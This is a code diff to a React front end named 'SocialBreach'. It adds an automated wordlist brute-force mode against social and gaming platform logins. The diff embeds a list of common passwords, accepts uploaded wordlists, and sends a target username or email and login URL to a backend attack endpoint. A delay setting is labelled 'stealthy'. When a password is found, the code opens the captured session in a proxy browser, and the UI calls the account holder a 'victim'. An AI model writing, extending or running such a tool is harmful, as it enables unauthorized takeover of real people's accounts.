@@ -6,13 +6,55 @@ import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import {
-  Search, Globe, Gamepad2, Smartphone, Monitor, RefreshCw,
+  Search, Globe, Gamepad2, Monitor, RefreshCw,
   LogIn, AlertOctagon, CheckCircle2, XCircle, ChevronLeft,
   ChevronRight, ExternalLink, Trash2, Clock, User, Shield,
-  Wifi, Layers, Radio,
+  Wifi, Layers, Radio, List, Upload, Zap, Square, KeyRound,
+  FileText, ChevronDown, ChevronUp,
 } from "lucide-react";
 
 const API = "/api/social-account";
+
+// ── Built-in password wordlist (top ~250 most common passwords) ───────────────
+const BUILTIN_WORDLIST: string[] = [
+  "123456","password","123456789","12345678","12345","1234567","1234567890",
+  "qwerty","abc123","111111","password1","iloveyou","1234","1q2w3e4r","000000",
+  "qwerty123","zaq12wsx","dragon","sunshine","princess","letmein","654321",
+  "monkey","27653","1qaz2wsx","123321","qwertyuiop","superman","michael",
+  "football","shadow","master","666666","qazwsx","123123","donald","password2",
+  "qwerty1","abc1234","hello","charlie","donald","987654321","pass","orange",
+  "badboy","george","andrew","batman","love","apple","trustno1","jessica","admin",
+  "welcome","login","passw0rd","test","Password1","Pa$$word","abc","987654",
+  "pass123","1111","11111111","asdfghjkl","asd123","baseball","dragon123",
+  "cheese","flower","zxcvbnm","0987654321","target123","tinkle","soccer",
+  "tigger","jennifer","buster","joshua","hunter","thomas","ranger","robert",
+  "hockey","killer","password123","dallas","jennifer","yellow","corvette",
+  "mercedes","pussy","gaming","jordan","junior","winter","matrix","forever",
+  "internet","samsung","password12","computer","starwars","freedom","ninja",
+  "pass1234","Summer2023","Summer2024","Winter2024","Spring2024","Fall2024",
+  "Admin123","Admin1234","P@ssword","P@ssword1","P@ssw0rd","Passw0rd!",
+  "Welcome1","Welcome123","changeme","letmein1","Qwerty123","Qwerty1234",
+  "Test1234","temp1234","default","guest","root","administrator","sysadmin",
+  "service","backup","data","secret","private","secure","login123","user1234",
+  "newuser","newpass","test123","demo","sample","example","system","public",
+  "access","connect","internet1","network","wireless","wifi","bluetooth",
+  "gaming123","steam123","discord","discord123","roblox","minecraft","fortnite",
+  "valorant","pokemon","mario","zelda","sonic","halo","warcraft","overwatch",
+  "league123","apex123","csgo123","gta123","gtav","rdr2","cod123","warzone",
+  "xbox123","ps4pass","ps5pass","nintendo","switch123","gamepass","epic123",
+  "twitch123","youtube","tiktok123","instagram","facebook1","twitter123",
+  "reddit123","linkedin","snapchat","whatsapp","telegram","signal123",
+  "Money123","Cash2024","Dollar123","€uro2024","Crypto123","Bitcoin1",
+  "Ethereum1","Solana123","Nft12345","Web3pass","Defi1234","Dao12345",
+  "qweasdzxc","1q2w3e","q1w2e3r4","asdf1234","zxcv1234","mnbv1234",
+  "poiu1234","lkjh1234","rewq1234","12qwas34","1a2s3d4f","qaz123wsx",
+  "Pa55word","Passw0rd","P4ssword","P@55w0rd","Pas5word","Passw0Rd",
+  "Tr0ub4dor","C0rrectH","h0rs3b4tt","p4ssw0rd","s3cur3p4","4dm1n1str",
+  "bl4ckh4t","wh1t3h4t","gr3yh4t","h4x0r123","ph34r_my","1337h4x0r",
+  "5up3rm4n","b4tm4n123","sp1d3rm4n","1r0nm4n12","4qu4m4n1",
+  "iloveyou1","iloveyou2","iloveyou3","ilove2024","ily1234","love2024",
+  "hate2024","life1234","living123","alive2024","death1234","kill1234",
+];
 
 // ── Platform Definitions ─────────────────────────────────────────────────────
 type PlatformDef = {
@@ -192,6 +234,139 @@ export default function SocialBreach() {
   const [navHistory, setNavHistory] = usePersistedState<string[]>("socialbreach-navhistory", []);
   const [navIndex, setNavIndex] = usePersistedState<number>("socialbreach-navindex", -1);
   const [sessions, setSessions] = useState<ActiveSession[]>([]);
+
+  // ── Brute-force / wordlist mode ────────────────────────────────────────────
+  const [attackMode, setAttackMode] = useState<"single" | "brute">("single");
+
+  // Brute config
+  const [bruteUsername, setBruteUsername] = useState("");
+  const [bruteEmail, setBruteEmail] = useState("");
+  const [bruteDelay, setBruteDelay] = useState(1500);
+  const [bruteUseBuiltin, setBruteUseBuiltin] = useState(true);
+  const [bruteCustomList, setBruteCustomList] = useState<string[]>([]);
+  const [bruteCustomFileName, setBruteCustomFileName] = useState("");
+  const [bruteShowBuiltin, setBruteShowBuiltin] = useState(false);
+
+  // Brute job state
+  type BruteEntry = { password: string; result: "found" | "failed" | "blocked"; msg: string };
+  type BruteJobState = {
+    jobId: string;
+    status: "running" | "stopped" | "found" | "exhausted";
+    tried: number;
+    total: number;
+    currentPassword: string;
+    foundPassword: string | null;
+    sessionId: string | null;
+    accountInfo: any;
+    log: BruteEntry[];
+  };
+  const [bruteJob, setBruteJob] = useState<BruteJobState | null>(null);
+  const brutePollerRef = useRef<ReturnType<typeof setInterval> | null>(null);
+
+  const clearBrutePoller = () => {
+    if (brutePollerRef.current !== null) {
+      clearInterval(brutePollerRef.current);
+      brutePollerRef.current = null;
+    }
+  };
+
+  const pollBruteJob = useCallback((jobId: string) => {
+    clearBrutePoller();
+    brutePollerRef.current = setInterval(async () => {
+      try {
+        const r = await fetch(`${API}/brute/status/${jobId}`);
+        if (!r.ok) { clearBrutePoller(); return; }
+        const d = await r.json();
+        setBruteJob(d);
+        if (d.status !== "running") {
+          clearBrutePoller();
+          if (d.status === "found") {
+            toast({ title: `🔓 Password found: ${d.foundPassword}`, description: `Platform: ${selected?.name}` });
+            // Auto-open session if one was created
+            if (d.sessionId && selected) {
+              const newSess: ActiveSession = {
+                id: d.sessionId, platform: selected,
+                accountInfo: d.accountInfo || {}, currentUrl: selected.homeUrl, loginMethod: "automated",
+              };
+              setSession(newSess);
+              setSessions(prev => [...prev.filter(s => s.id !== d.sessionId), newSess]);
+              setStatus("breached");
+              setStatusMsg("Password found — session acquired");
+              const proxy = `${API}/navigate?sid=${d.sessionId}&url=${encodeURIComponent(selected.homeUrl)}`;
+              setNavHistory([proxy]);
+              setNavIndex(0);
+              setTimeout(() => { if (iframeRef.current) iframeRef.current.src = proxy; }, 300);
+            }
+          } else if (d.status === "exhausted") {
+            toast({ title: "Wordlist exhausted — no match found", variant: "destructive" });
+          }
+        }
+      } catch { clearBrutePoller(); }
+    }, 1000);
+  }, [selected, toast]);
+
+  const startBrute = async () => {
+    if (!selected) return;
+    const u = selected.fields.username ? bruteUsername : bruteEmail;
+    if (!u.trim()) { toast({ title: "Enter a username / email to attack", variant: "destructive" }); return; }
+
+    const wordlist = [
+      ...(bruteUseBuiltin ? BUILTIN_WORDLIST : []),
+      ...bruteCustomList,
+    ].filter(p => p.trim().length > 0);
+
+    if (wordlist.length === 0) { toast({ title: "No passwords in wordlist", variant: "destructive" }); return; }
+
+    setBruteJob(null);
+
+    try {
+      const r = await fetch(`${API}/brute/start`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          platform: selected.id, username: u.trim(),
+          passwords: wordlist, loginUrl: customUrl || selected.loginUrl, delay: bruteDelay,
+        }),
+      });
+      const d = await r.json();
+      if (d.jobId) {
+        setBruteJob({ jobId: d.jobId, status: "running", tried: 0, total: d.total, currentPassword: "", foundPassword: null, sessionId: null, accountInfo: null, log: [] });
+        pollBruteJob(d.jobId);
+      } else {
+        toast({ title: d.error || "Failed to start brute job", variant: "destructive" });
+      }
+    } catch (e: any) {
+      toast({ title: "Network error", description: e.message, variant: "destructive" });
+    }
+  };
+
+  const stopBrute = async () => {
+    if (!bruteJob) return;
+    clearBrutePoller();
+    try {
+      await fetch(`${API}/brute/stop/${bruteJob.jobId}`, { method: "POST" });
+      setBruteJob(prev => prev ? { ...prev, status: "stopped" } : null);
+    } catch { /* ignore */ }
+  };
+
+  const handleWordlistUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    setBruteCustomFileName(file.name);
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+      const text = ev.target?.result as string;
+      const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0 && l.length <= 128);
+      setBruteCustomList(lines);
+      toast({ title: `Loaded ${lines.length.toLocaleString()} passwords from ${file.name}` });
+    };
+    reader.readAsText(file);
+    e.target.value = "";
+  };
+
+  useEffect(() => {
+    return () => clearBrutePoller();
+  }, []);
 
   // Load active sessions on mount
   useEffect(() => {
@@ -489,8 +664,22 @@ export default function SocialBreach() {
                   </div>
                 </div>
 
-                {/* Credential form */}
+                {/* Attack Mode Toggle */}
                 {(status === "idle" || status === "failed") && (
+                  <div className="flex gap-2 mb-3">
+                    <button onClick={() => setAttackMode("single")}
+                      className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold border transition-all ${attackMode === "single" ? "bg-blue-900/60 border-blue-700 text-blue-300" : "bg-gray-800 border-gray-700 text-gray-500 hover:text-gray-300"}`}>
+                      <LogIn className="h-3 w-3" /> Single Attempt
+                    </button>
+                    <button onClick={() => setAttackMode("brute")}
+                      className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold border transition-all ${attackMode === "brute" ? "bg-orange-900/60 border-orange-700 text-orange-300" : "bg-gray-800 border-gray-700 text-gray-500 hover:text-gray-300"}`}>
+                      <Zap className="h-3 w-3" /> Auto Brute
+                    </button>
+                  </div>
+                )}
+
+                {/* Credential form — Single Attempt */}
+                {(status === "idle" || status === "failed") && attackMode === "single" && (
                   <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                     {selected.fields.username && (
                       <div>
@@ -526,6 +715,114 @@ export default function SocialBreach() {
                   </div>
                 )}
 
+                {/* ── Auto Brute Panel ─────────────────────────────────────── */}
+                {(status === "idle" || status === "failed") && attackMode === "brute" && (
+                  <div className="space-y-3">
+                    {/* Target identity row */}
+                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
+                      {selected.fields.username && (
+                        <div>
+                          <label className="text-xs text-gray-500 mb-1 block">Target Username</label>
+                          <Input value={bruteUsername} onChange={e => setBruteUsername(e.target.value)} placeholder="victim_username" className="bg-gray-800 border-gray-700 text-white text-sm h-9 font-mono" />
+                        </div>
+                      )}
+                      {selected.fields.email && (
+                        <div>
+                          <label className="text-xs text-gray-500 mb-1 block">Target Email</label>
+                          <Input value={bruteEmail} onChange={e => setBruteEmail(e.target.value)} placeholder="target@email.com" type="email" className="bg-gray-800 border-gray-700 text-white text-sm h-9 font-mono" />
+                        </div>
+                      )}
+                      <div>
+                        <label className="text-xs text-gray-500 mb-1 block">Target URL <span className="text-gray-700">(override)</span></label>
+                        <Input value={customUrl} onChange={e => setCustomUrl(e.target.value)} placeholder={selected.loginUrl} className="bg-gray-800 border-gray-700 text-white text-sm h-9 font-mono" />
+                      </div>
+                    </div>
+
+                    {/* Wordlist config */}
+                    <div className="bg-gray-800/50 border border-gray-700 rounded-lg p-3 space-y-2">
+                      <div className="text-xs font-bold text-gray-400 uppercase tracking-wider flex items-center gap-1.5 mb-1">
+                        <List className="h-3.5 w-3.5 text-orange-400" /> Password Wordlist
+                      </div>
+
+                      {/* Built-in toggle */}
+                      <div className="flex items-center justify-between">
+                        <label className="flex items-center gap-2 cursor-pointer">
+                          <div onClick={() => setBruteUseBuiltin(v => !v)}
+                            className={`w-9 h-5 rounded-full border transition-colors flex items-center ${bruteUseBuiltin ? "bg-orange-700 border-orange-600" : "bg-gray-700 border-gray-600"}`}>
+                            <div className={`w-3.5 h-3.5 rounded-full bg-white shadow transition-transform mx-0.5 ${bruteUseBuiltin ? "translate-x-4" : "translate-x-0"}`} />
+                          </div>
+                          <span className="text-xs text-gray-300">Built-in wordlist</span>
+                          <span className="text-[10px] text-gray-600">({BUILTIN_WORDLIST.length} passwords)</span>
+                        </label>
+                        <button onClick={() => setBruteShowBuiltin(v => !v)} className="text-[10px] text-gray-600 hover:text-gray-400 flex items-center gap-1">
+                          {bruteShowBuiltin ? <ChevronUp className="h-3 w-3" /> : <ChevronDown className="h-3 w-3" />}
+                          {bruteShowBuiltin ? "hide" : "preview"}
+                        </button>
+                      </div>
+
+                      {bruteShowBuiltin && (
+                        <div className="bg-gray-900 border border-gray-700 rounded p-2 max-h-24 overflow-y-auto">
+                          <p className="text-[10px] font-mono text-gray-500 break-all leading-relaxed">
+                            {BUILTIN_WORDLIST.slice(0, 60).join(", ")}
+                            <span className="text-gray-700"> …and {BUILTIN_WORDLIST.length - 60} more</span>
+                          </p>
+                        </div>
+                      )}
+
+                      {/* Custom upload */}
+                      <div className="flex items-center gap-2 pt-1">
+                        <label className="flex items-center gap-1.5 cursor-pointer px-3 py-1.5 rounded-lg border border-gray-600 text-xs text-gray-400 hover:border-orange-700 hover:text-orange-300 transition-colors bg-gray-800">
+                          <Upload className="h-3.5 w-3.5" />
+                          Upload .txt wordlist
+                          <input type="file" accept=".txt,text/plain" onChange={handleWordlistUpload} className="hidden" />
+                        </label>
+                        {bruteCustomFileName && (
+                          <div className="flex items-center gap-1.5 text-xs text-green-400">
+                            <FileText className="h-3 w-3" />
+                            <span className="font-mono truncate max-w-[180px]">{bruteCustomFileName}</span>
+                            <span className="text-gray-600">({bruteCustomList.length.toLocaleString()} passwords)</span>
+                            <button onClick={() => { setBruteCustomList([]); setBruteCustomFileName(""); }} className="text-gray-600 hover:text-red-400 ml-1">
+                              <XCircle className="h-3 w-3" />
+                            </button>
+                          </div>
+                        )}
+                      </div>
+
+                      {/* Total count */}
+                      <div className="flex items-center gap-1.5 pt-0.5">
+                        <KeyRound className="h-3 w-3 text-orange-500" />
+                        <span className="text-xs text-gray-500">
+                          Total:{" "}
+                          <span className="text-orange-300 font-bold font-mono">
+                            {((bruteUseBuiltin ? BUILTIN_WORDLIST.length : 0) + bruteCustomList.length).toLocaleString()}
+                          </span>{" "}
+                          passwords to try
+                        </span>
+                      </div>
+                    </div>
+
+                    {/* Delay slider */}
+                    <div>
+                      <div className="flex items-center justify-between mb-1">
+                        <label className="text-xs text-gray-500">Delay between attempts</label>
+                        <span className="text-xs font-mono text-orange-300">{bruteDelay >= 1000 ? `${(bruteDelay / 1000).toFixed(1)}s` : `${bruteDelay}ms`}</span>
+                      </div>
+                      <input type="range" min={300} max={5000} step={100} value={bruteDelay} onChange={e => setBruteDelay(Number(e.target.value))}
+                        className="w-full h-1.5 rounded-full appearance-none cursor-pointer bg-gray-700 accent-orange-500" />
+                      <div className="flex justify-between text-[10px] text-gray-700 mt-0.5">
+                        <span>300ms (fast)</span><span>5s (stealthy)</span>
+                      </div>
+                    </div>
+
+                    {/* Launch button */}
+                    <div className="flex gap-2">
+                      <Button onClick={startBrute} className="flex-1 h-9 bg-orange-700 hover:bg-orange-600 text-white font-bold">
+                        <Zap className="h-4 w-4 mr-2" /> Launch Wordlist Attack
+                      </Button>
+                    </div>
+                  </div>
+                )}
+
                 {(status === "connecting" || status === "authenticating") && (
                   <div className="flex items-center gap-3 py-3">
                     <RefreshCw className="h-5 w-5 animate-spin text-amber-400 shrink-0" />
@@ -551,6 +848,96 @@ export default function SocialBreach() {
                   </div>
                 )}
               </div>
+
+              {/* ── Brute Job Progress Panel ───────────────────────────── */}
+              {bruteJob && (
+                <div className="bg-gray-900 border border-orange-900/50 rounded-xl p-4 space-y-3">
+                  {/* Header row */}
+                  <div className="flex items-center justify-between gap-3">
+                    <div className="flex items-center gap-2">
+                      <Zap className={`h-4 w-4 ${bruteJob.status === "running" ? "text-orange-400 animate-pulse" : bruteJob.status === "found" ? "text-green-400" : "text-gray-500"}`} />
+                      <span className="text-sm font-bold text-white">
+                        {bruteJob.status === "running" && "Brute Force Running"}
+                        {bruteJob.status === "found" && "Password Found!"}
+                        {bruteJob.status === "exhausted" && "Wordlist Exhausted — No Match"}
+                        {bruteJob.status === "stopped" && "Attack Stopped"}
+                      </span>
+                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded border ${
+                        bruteJob.status === "running" ? "bg-orange-950 border-orange-800 text-orange-400" :
+                        bruteJob.status === "found" ? "bg-green-950 border-green-800 text-green-400" :
+                        "bg-gray-800 border-gray-700 text-gray-500"
+                      }`}>{bruteJob.status.toUpperCase()}</span>
+                    </div>
+                    <div className="flex items-center gap-2">
+                      {bruteJob.status === "running" && (
+                        <Button onClick={stopBrute} className="h-7 px-3 bg-red-900 hover:bg-red-800 text-red-300 text-xs font-bold">
+                          <Square className="h-3 w-3 mr-1" /> Stop
+                        </Button>
+                      )}
+                      {bruteJob.status !== "running" && (
+                        <button onClick={() => { setBruteJob(null); }} className="text-xs text-gray-600 hover:text-gray-400">
+                          <XCircle className="h-4 w-4" />
+                        </button>
+                      )}
+                    </div>
+                  </div>
+
+                  {/* Progress bar */}
+                  <div>
+                    <div className="flex justify-between text-xs text-gray-500 mb-1">
+                      <span>Tried <span className="text-orange-300 font-mono font-bold">{bruteJob.tried.toLocaleString()}</span> / <span className="font-mono">{bruteJob.total.toLocaleString()}</span></span>
+                      <span className="font-mono">{bruteJob.total > 0 ? Math.round((bruteJob.tried / bruteJob.total) * 100) : 0}%</span>
+                    </div>
+                    <div className="h-2 bg-gray-800 rounded-full overflow-hidden">
+                      <div
+                        className={`h-full rounded-full transition-all duration-500 ${bruteJob.status === "found" ? "bg-green-500" : bruteJob.status === "exhausted" || bruteJob.status === "stopped" ? "bg-gray-600" : "bg-orange-500"}`}
+                        style={{ width: bruteJob.total > 0 ? `${(bruteJob.tried / bruteJob.total) * 100}%` : "0%" }}
+                      />
+                    </div>
+                  </div>
+
+                  {/* Current attempt */}
+                  {bruteJob.status === "running" && bruteJob.currentPassword && (
+                    <div className="flex items-center gap-2 text-xs font-mono">
+                      <span className="text-gray-600">Trying:</span>
+                      <span className="text-orange-300 bg-orange-950/40 border border-orange-900/40 px-2 py-0.5 rounded">{bruteJob.currentPassword}</span>
+                    </div>
+                  )}
+
+                  {/* Found result */}
+                  {bruteJob.status === "found" && bruteJob.foundPassword && (
+                    <div className="bg-green-950/50 border border-green-800 rounded-lg p-3 flex items-center gap-3">
+                      <CheckCircle2 className="h-5 w-5 text-green-400 shrink-0" />
+                      <div>
+                        <div className="text-xs text-green-400 font-bold mb-0.5">Correct Password Found</div>
+                        <div className="text-base font-mono font-black text-green-300 tracking-wider">{bruteJob.foundPassword}</div>
+                        {bruteJob.accountInfo?.username && <div className="text-xs text-green-600 mt-0.5">Account: {bruteJob.accountInfo.username}</div>}
+                        {bruteJob.accountInfo?.email && <div className="text-xs text-green-600 mt-0.5">Email: {bruteJob.accountInfo.email}</div>}
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Live log */}
+                  {bruteJob.log.length > 0 && (
+                    <div className="bg-gray-950 border border-gray-800 rounded-lg overflow-hidden">
+                      <div className="text-[10px] font-bold text-gray-600 uppercase tracking-wider px-3 py-1.5 border-b border-gray-800 flex items-center gap-1.5">
+                        <Radio className="h-2.5 w-2.5 text-orange-500 animate-pulse" /> Live Log (last {Math.min(bruteJob.log.length, 30)} attempts)
+                      </div>
+                      <div className="max-h-36 overflow-y-auto p-2 space-y-0.5 font-mono text-[10px]">
+                        {[...bruteJob.log].reverse().map((entry, i) => (
+                          <div key={i} className={`flex items-start gap-2 px-1 py-0.5 rounded ${entry.result === "found" ? "bg-green-950/40" : entry.result === "blocked" ? "bg-yellow-950/30" : ""}`}>
+                            <span className={entry.result === "found" ? "text-green-400" : entry.result === "blocked" ? "text-yellow-500" : "text-gray-700"}>
+                              {entry.result === "found" ? "✓" : entry.result === "blocked" ? "⚠" : "✗"}
+                            </span>
+                            <span className={`shrink-0 ${entry.result === "found" ? "text-green-300 font-bold" : "text-gray-500"}`}>{entry.password}</span>
+                            <span className="text-gray-700 truncate">{entry.msg}</span>
+                          </div>
+                        ))}
+                      </div>
+                    </div>
+                  )}
+                </div>
+              )}
 
               {/* Proxy browser */}
               {session && (
